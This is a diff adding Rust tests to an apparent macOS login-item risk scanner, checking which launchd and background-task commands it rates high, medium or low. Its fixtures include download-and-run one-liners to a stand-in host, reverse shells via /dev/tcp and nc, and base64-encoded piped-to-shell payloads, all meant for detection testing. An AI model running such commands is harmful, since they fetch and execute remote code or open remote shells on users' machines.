@@ -191,6 +191,115 @@ fn base64_cron_job_is_high() {
     assert_eq!(e.risk, "high");
 }
 
+fn agent(args: &str) -> Item {
+    item(
+        "launchd",
+        "/Users/me/Library/LaunchAgents/x.plist",
+        &[
+            ("Label", "x"),
+            ("ProgramArguments", args),
+            ("scope", "user agent"),
+        ],
+    )
+}
+
+#[test]
+fn download_and_run_variants_are_high() {
+    for args in [
+        "/usr/bin/python3 -c import urllib.request as u;exec(u.urlopen('http://x.example/p').read())",
+        "/bin/sh -c curl -fsSL https://x.example/i | sudo bash",
+        "/bin/sh -c curl -fsSL https://x.example/i | /usr/bin/env -i bash -s",
+        "/bin/sh -c curl -s https://x.example/i | xargs -0 zsh -c",
+        "/bin/sh -c \"$(curl -fsSL https://x.example/i)\"",
+        "/bin/bash -c bash <(curl https://x.example/i)",
+        "/bin/zsh -c eval `wget -qO- https://x.example/i`",
+        "/bin/sh -c curl -o /tmp/x https://x.example/i && sh /tmp/x",
+        "/bin/sh -c wget -O /tmp/x https://x.example/i; chmod +x /tmp/x; /tmp/x",
+        "/usr/bin/osascript -e do shell script \"curl -s http://x.example/p -o /tmp/p\"",
+        "/usr/bin/perl -MLWP::Simple -e eval get('http://x.example/p')",
+        "/usr/bin/python3.11 -c import requests;exec(requests.get('http://x').text)",
+        "/bin/bash -c bash -i >& /dev/tcp/203.0.113.5/4444 0>&1",
+        "/usr/bin/nc 203.0.113.5 4444 -e /bin/sh",
+        "/bin/sh -c echo Y3VybCB4IHwgc2g= | base64 --decode | sh",
+        "/bin/sh -c sh -c \"$(echo Y3VybCB4IHwgc2g= | base64 -D)\"",
+    ] {
+        let e = explain(&agent(args));
+        assert_eq!(e.risk, "high", "{args}");
+        assert!(e.risk_reason.is_some(), "{args}");
+    }
+}
+
+#[test]
+fn btm_only_item_that_downloads_and_runs_is_high() {
+    let e = explain(&item(
+        "btm",
+        "uid 501: 8.evil",
+        &[
+            ("type", "legacy agent (0x10008)"),
+            ("executable", "/bin/sh -c curl -s http://x.example/p | sh"),
+            ("url", "/Users/501/Library/LaunchAgents/evil.plist"),
+            ("developer", "Some Dev"),
+        ],
+    ));
+    assert_eq!(e.risk, "high");
+}
+
+#[test]
+fn fetch_or_dns_lookup_alone_is_not_high() {
+    for args in [
+        "/bin/sh -c curl -fsS -m 10 https://hc-ping.com/abc",
+        "/usr/bin/sdig +short TXT example.com | sh",
+        "/bin/sh -c dig +short example.com > out.txt",
+        "/bin/sh -c echo $(hostname) | sh",
+        "/bin/sh -c sync && launchctl list; sh /usr/local/bin/after.sh",
+    ] {
+        assert_ne!(explain(&agent(args)).risk, "high", "{args}");
+    }
+}
+
+#[test]
+fn legit_updaters_are_not_high() {
+    let google = explain(&agent(
+        "/Users/me/Library/Application Support/Google/GoogleUpdater/Current/GoogleUpdater.app/Contents/MacOS/GoogleUpdater --wake-all --enable-logging --vmodule=*/components/update_client/*=2,*/chrome/updater/*=2",
+    ));
+    assert_ne!(google.risk, "high");
+    let adobe = explain(&agent(
+        "/Applications/Utilities/Adobe Creative Cloud Experience/CCXProcess/CCXProcess.app/Contents/MacOS/CCXProcess --openAtBoot",
+    ));
+    assert_ne!(adobe.risk, "high");
+    let items = btm::parse(include_str!("fixtures/sfltool-dumpbtm.txt"));
+    assert!(items.iter().all(|i| explain(i).risk != "high"));
+}
+
+#[test]
+fn program_in_a_temp_shared_or_hidden_folder_is_at_least_medium() {
+    for (category, field, path) in [
+        ("launchd", "Program", "/tmp/update"),
+        ("launchd", "Program", "/private/tmp/update"),
+        (
+            "launchd",
+            "ProgramArguments",
+            "/Users/Shared/.x/agent --run",
+        ),
+        (
+            "launchd",
+            "ProgramArguments",
+            "/usr/bin/python3 -u /Users/me/.cache/x.py",
+        ),
+        ("btm", "executable", "/Users/501/.local/bin/helper"),
+        ("btm", "url", "file:///Users/Shared/Helper.app/"),
+    ] {
+        let mut i = item(category, "k", &[(field, path)]);
+        i.team_id = Some("EQHXZ8M8AV".into());
+        let e = explain(&i);
+        assert_eq!(e.risk, "medium", "{path}");
+        assert!(e.risk_reason.unwrap().contains("folder"), "{path}");
+    }
+    let mut ok = item("launchd", "k", &[("Program", "/Users/me/bin/tool")]);
+    ok.team_id = Some("EQHXZ8M8AV".into());
+    assert_eq!(explain(&ok).risk, "low");
+}
+
 #[test]
 fn field_labels_fall_back_to_the_raw_name() {
     assert_eq!(field_label("ProgramArguments"), "What it runs");
